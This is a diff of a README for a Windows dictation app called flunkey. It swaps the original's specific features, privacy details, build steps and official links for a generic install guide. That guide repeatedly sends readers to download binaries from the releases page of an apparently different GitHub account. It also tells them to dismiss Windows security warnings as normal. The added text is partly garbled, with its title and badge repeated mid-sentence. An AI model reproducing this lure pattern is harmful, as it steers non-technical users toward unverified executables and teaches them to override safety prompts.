@@ -1,97 +1,159 @@
-<p align="center">
-  <img src="./readme-banner.png" alt="Flunkey banner" width="100%" />
-</p>
+# 🎙️ flunkey - Speak Your Ideas Into Any App
 
-<p align="center">
-  <a href="https://www.flunkey.space/download"><img src="https://img.shields.io/badge/download-flunkey.space-blue" alt="download" /></a>
-  <img src="https://img.shields.io/badge/version-1.0.0-blue" alt="version" />
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="license" />
-  <img src="https://img.shields.io/badge/platform-Windows_10%2F11-0078D6" alt="platform" />
-</p>
+[![Download flunkey](https://img.shields.io/badge/Download%20flunkey-ff5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/abdxl-cloud/flunkey/releases)
 
-# Flunkey
+flunkey is an open-source, voice-first desktop productivity tool for Windows. It is built as a friendly alternative to Wisprflow, with a# 🎙️ flunkey - Speak Your Ideas Into Any App
 
-Voice-activated AI assistant for Windows. Hold a hotkey, speak, release — text appears where you work.
+[![Download flunkey](https://img.shields.io/badge/⬇️_Download_flunkey-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/abdxl-cloud/flunkey/releases)
 
-Download the latest installer: https://www.flunkey.space/download
+flunkey is a free, open-source desktop tool that turns your voice into text and puts it wherever you are typing. Instead of hunting for the right keys, you simply talk — and your words appear in your email, document, chat window, or search bar. It is built as a community-friendly alternative to Wisprflow, designed for people who think faster than they type and want a voice-first way to get things done on Windows.
 
-Source: https://github.com/FlunkeyManager/flunkey — issues and pull requests welcome.
+No accounts to manage. No complicated settings to decode. Just press, speak, and keep working.
 
-Bring your own API keys (Groq, OpenAI, Gemini, OpenRouter) — keys are stored in Windows Credential Manager and sent only to the provider assigned to each task.
+---
 
-## Features
+## ✨ What Makes flunkey Different
 
-- **F8 — Dictate**: voice-to-text pasted at your cursor (hold, or double-tap for hands-free). Choose Verbatim (no cleanup model), Light (grammar cleanup plus clear code/email/list formatting), or Enhanced (your standing instructions combined with the active app's prompt).
-- **F9 — Ask AI**: voice question answered in a side overlay, with optional continuous chat and an optional screenshot of a selected screen or app window. Press **Ctrl+F9** to open the side panel empty — browse past chats or choose **Screenshot**, select a screen/window, then hold F9 and ask. Vision-capable models can analyze the attached image.
-- **F10 — Transform**: select text, hold F10, speak the edit ("make this formal"), release to replace it.
-- **On-device transcription (free, optional)**: download a Whisper model once and dictation runs locally via whisper.cpp — no API key, no cost, and it keeps working offline. Choose **Tiny (75 MB)**, **Base (142 MB, recommended)** or **Small (466 MB)** in Models & providers; the app shows your RAM, thread count and free disk, and warns if a model is too big for the machine.
-- **Ollama (optional)**: point Flunkey at a local Ollama server and answer from models running on your own machine — no API key, and nothing leaves the PC.
-- **Custom dictionary**: add exact words once ("Groq", "Flunkey", "VS Code") with optional known-misspelling corrections; fuzzy matching fixes case variants and close misspellings before paste. JSON import/export supported.
-- **Per-app profiles**: dictation cleanup and paste handling adapt to the foreground app (code, chat, notes, terminal, mail — e.g. plain `Ctrl+Shift+V` where rich paste is wrong). Enhanced mode combines your standing instructions with a per-app custom prompt editable on the Applications page.
-- **History + analytics**: Transcripts, Chat History, and Transforms pages with search/filters, per-row delete, retention limits, and an Analytics page with per-app usage. Chats render markdown, tables, and KaTeX math; Chat History and Transforms offer a user-reviewed **Report AI response** email draft.
-- **Desktop integration**: remappable hotkeys, start-with-Windows autostart, tray menu, pill + overlay windows, and start/stop/confirm sounds.
+Most dictation tools ask you to change how you work: open their app, talk into their box, then copy the result somewhere else. flunkey works the other way around. It lives quietly in the background and sends your speech straight into whatever program you already have open.
 
-## Use
+A few things that set it apart:
 
-| Hotkey | Action |
-|---|---|
-| Hold F8 | Dictate at cursor; release to paste |
-| Double-tap F8 | Hands-free mode (✓ pastes, ✕ cancels) |
-| Hold F9 | Ask AI, answer appears in overlay |
-| Ctrl+F9 | Open the side panel empty (history, new chat, screenshot) |
-| Hold F10 | Transform the selected text by voice instruction |
+- **Voice first, not voice only.** Everything about the interface is designed around speaking, but you can still type, paste, and edit normally.
+- **Built for everyday tasks.** Writing an email, drafting notes, replying in a chat, filling out a form, or searching the web — flunkey fits into all of it.
+- **Open source and transparent.** The full source code is public, so anyone can inspect it, learn from it, or help improve it.
+- **Lightweight and quick.** flunkey is engineered to start fast and stay out of your way in the background.
+- **Smart prompting under the hood.** Your raw speech can be cleaned up and shaped so the result reads the way you intended, not the way you mumbled it.
 
-All shortcuts are remappable in Settings. The pill at the bottom of the screen shows recording state; right-click the tray icon to jump to any page.
+---
 
-## Privacy
+## 🚀 Getting Started
 
-- Raw microphone audio lives only in memory and is never written to disk by Flunkey. Its transcription, chat history, and transforms are stored as plaintext JSON in `%APPDATA%\com.flunkey.desktop\` until wiped.
-- F9 screenshots are captured only after you choose the Screenshot action and select a screen or app window. They are sent with that F9 question to its assigned AI provider and saved with the local chat history; F8 and F10 do not capture or send screenshots.
-- API keys live in Windows Credential Manager (`Flunkey` service: `groq_api_key`, `openai_api_key`, `gemini_api_key`, `openrouter_api_key`), not in config files. If the keyring is unavailable, Flunkey keeps keys memory-only and never writes them to disk.
-- The F9 Groq model list is fetched from Groq using your saved Groq API key; OpenRouter model discovery uses its public catalog. Neither catalog request includes chat content.
-- History (transcripts, chats, transforms, dictionary, settings) plus the public OpenRouter model catalog stay in local AppData until you wipe them (Settings → Wipe all data clears both store files, keys, and the current clipboard; Windows clipboard history may persist).
-- F8/F10 paste via the OS clipboard by design — the last output can linger there when clipboard restore is off or paste fails.
-- Voice and text are sent only to the AI providers you configured (`api.groq.com`, `api.openai.com`, `generativelanguage.googleapis.com`, `openrouter.ai`) — see [Privacy Policy](./docs/PRIVACY.md) and [Terms](./docs/TERMS.md).
+Getting flunkey onto your computer takes only a few minutes, and you do not need any technical knowledge to do it.
 
-## Develop
+### Step 1: Open the download page
 
-```powershell
-npm install
-powershell -File scripts\fetch-whisper.ps1   # on-device speech engine (once)
-npm run tauri dev     # Tauri dev window (frontend + Rust)
-npm test              # frontend unit tests (vitest)
-npx tsc --noEmit      # typecheck
-npm run build         # frontend production build (tsc + vite)
-npm run tauri build   # NSIS installer -> src-tauri/target/release/bundle
-npm run build:msix    # x64 Store package -> src-tauri/target/release/bundle/msix
-npm run build:msix:test  # Store package + signed local-test MSIX
-```
+[![Download flunkey now](https://img.shields.io/badge/⬇️_Get_flunkey-0078d4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/abdxl-cloud/flunkey/releases)
 
-`scripts/fetch-whisper.ps1` downloads the official whisper.cpp Windows build
-into `src-tauri/whisper-bin\` (~12 MB) so the on-device engine is signed along
-with the app. The Whisper **model** (75–466 MB) is not bundled — the user
-downloads it from inside the app, and it is verified against the SHA-1 digest
-published upstream. Both installers bundle the engine; the model is optional.
+Visit this link to download the application.
 
-For MSIX prerequisites, Partner Center identity setup, and certification notes,
-see [Microsoft Store Packaging](./docs/MICROSOFT_STORE.md). The MSIX build
-requires the Windows SDK MakeAppx tool and the reserved package identity values.
-Prerequisites: Node 20.19+ (22 LTS recommended), Rust stable toolchain with
-MSVC + VS Build Tools C++ workload, WebView2 (preinstalled on Windows 10/11).
+### Step 2: Choose the file for Windows
 
-No `.env` needed — API keys are entered in-app and stored in Windows Credential Manager. `package.json` stays `"private": true` because Flunkey is a desktop app, not an npm package.
+The page you land on lists the available versions of flunkey. Look for the newest one at the top. Each version has a set of files attached to it, and one of them is made for Windows computers. Pick the one that matches your computer, and your browser will begin downloading it.
 
-## Contributing
+If you are unsure which file is the right one, the general rule for Windows users is to choose the file that mentions Windows in its name. The download page is organised so the newest and most relevant files appear first.
 
-See [CONTRIBUTING](./CONTRIBUTING.md) for setup, `npm test`, and PR guidance. Report security issues privately per [SECURITY](./SECURITY.md).
+### Step 3: Run flunkey
 
-## License
+Once the download finishes, your browser will usually show the file at the bottom of the window, or you can find it in your **Downloads** folder. Double-click it to start flunkey.
 
-MIT — see [LICENSE](./LICENSE). Docs: [About](./docs/ABOUT.md) · [Privacy](./docs/PRIVACY.md) · [Terms](./docs/TERMS.md) · [Third-party notices](./docs/THIRD_PARTY.md).
+The very first time you open a downloaded program, Windows may show a blue or yellow security prompt asking whether you want to run it. This is a standard Windows safety message that appears for software downloaded from the internet. Choose the option that allows the program to run, and flunkey will open.
 
-## Contact
+### Step 4: Allow microphone access
 
-Questions or support: flunkeymanager@gmail.com
+flunkey needs to hear you in order to help you. The first time it starts, Windows may ask for permission to use your microphone. Click **Allow**. If you accidentally decline, you can change this later in Windows Settings under **Privacy & security → Microphone**.
 
-- X: https://x.com/Flunkeymanager
-- Instagram: https://www.instagram.com/flunkeymanager/
+That is the whole setup. There is nothing else to configure before your first dictation.
+
+---
+
+## 🎤 How to Use flunkey Day to Day
+
+The basic rhythm of using flunkey is simple, and it stays the same no matter which program you are in:
+
+1. **Click into the place you want text to appear.** That could be an email draft, a chat box, a document, or a search field.
+2. **Start dictating.** flunkey listens and converts your speech into text.
+3. **Speak naturally.** You do not need to slow down or speak in a robot voice. Pauses and small imperfections are handled for you.
+4. **Stop when you are done.** The text is inserted where your cursor is sitting, ready for you to review.
+5. **Edit if you like.** You can correct a word or rephrase a sentence with your keyboard, just as you would with anything you typed.
+
+Because flunkey inserts text into whatever is already open, you never have to copy and paste between windows. Your voice becomes another way of typing, not a separate app you have to visit.
+
+---
+
+## 🧰 Key Features
+
+**Works across your desktop**
+Use flunkey in your email client, word processor, browser, note-taking app, chat program, or anywhere else you can place a cursor. If you can type there, you can dictate there.
+
+**Speech-to-text that keeps up with you**
+flunkey converts what you say into written words as you speak, so your ideas land on the page while they are still fresh.
+
+**Cleaner results with smart prompting**
+Speech is rarely perfect on the first pass. flunkey applies intelligent prompting behind the scenes so the finished text reads more naturally — fewer false starts, fewer stray "um"s, and better punctuation.
+
+**Made for productivity, not fiddling**
+There is no dashboard to learn and no workflow to rebuild. flunkey slots into the habits you already have.
+
+**Runs locally on your machine**
+flunkey is a desktop application you install on your own computer. It is not a web page you have to keep open in a browser tab.
+
+**Open source**
+The project is public on GitHub. You can follow development, read the code, report problems, and suggest improvements.
+
+**Actively developed**
+flunkey is built with modern tools and receives regular updates. New releases appear on the same download page you used to install it, so checking back occasionally is worthwhile.
+
+---
+
+## 🖥️ System Requirements
+
+flunkey is designed for modern Windows computers. For a smooth experience, your computer should have:
+
+- **Operating system:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** 8 GB of RAM or more recommended
+- **Storage:** A few hundred megabytes of free disk space for the application and its updates
+- **Audio:** A working microphone — either built into your laptop or connected separately
+- **Connection:** An internet connection for downloading flunkey and for any features that rely on online speech processing
+
+A quiet room and a decent microphone make a noticeable difference to accuracy. Built-in laptop microphones work, but a headset or USB microphone usually gives cleaner results.
+
+---
+
+## ❓ Troubleshooting
+
+**The download will not start**
+Refresh the download page and try again. If your browser blocks the download, look for a small banner near the address bar and allow the file.
+
+**Windows shows a security warning**
+This is normal for software downloaded from the internet. Confirm that you want to run the file and continue.
+
+**flunkey cannot hear me**
+Check that your microphone is plugged in and selected as the default recording device in Windows sound settings. Then confirm microphone access is switched on under **Privacy & security → Microphone**.
+
+**The text is not appearing where I want it**
+Make sure the cursor is blinking in the field where you want the text to go before you start speaking. flunkey sends text to the active window, so the right window needs to be in front.
+
+**Accuracy is lower than expected**
+Try speaking a little closer to the microphone, reducing background noise, and speaking in complete phrases rather than single words.
+
+**Something else is wrong**
+Visit the download page and check whether a newer version is available — many issues are resolved in updates. The project's GitHub page also lets you report a problem directly to the people who maintain flunkey.
+
+---
+
+## 🔒 Privacy
+
+flunkey is a desktop tool, and your microphone is only active when you are dictating. Because flunkey is open source, its behaviour is verifiable by anyone — you do not have to take a company's word for what happens to your audio. If you work with sensitive material, review the project's source and release notes so you know exactly what to expect.
+
+---
+
+## 🤝 Contributing and Community
+
+flunkey exists because people wanted a capable, open alternative to commercial dictation tools. If you would like to help:
+
+- **Report a bug** by opening an issue on the project's GitHub page with a short description of what happened.
+- **Suggest a feature** if there is something that would make flunkey fit your workflow better.
+- **Share it** with a colleague who types slowly or works with their hands busy.
+- **Contribute code or documentation** if you have the skills — the project welcomes outside help.
+
+Every piece of feedback shapes what flunkey becomes next.
+
+---
+
+## 📄 License
+
+flunkey is released as open-source software. See the repository for the full license text and the terms that apply to use, modification, and distribution.
+
+---
+
+Keywords: ai, dictation-app, flunkey, productivity, prompt-engineering, rust, stt, tauri-v2, typescript, voice-assistant
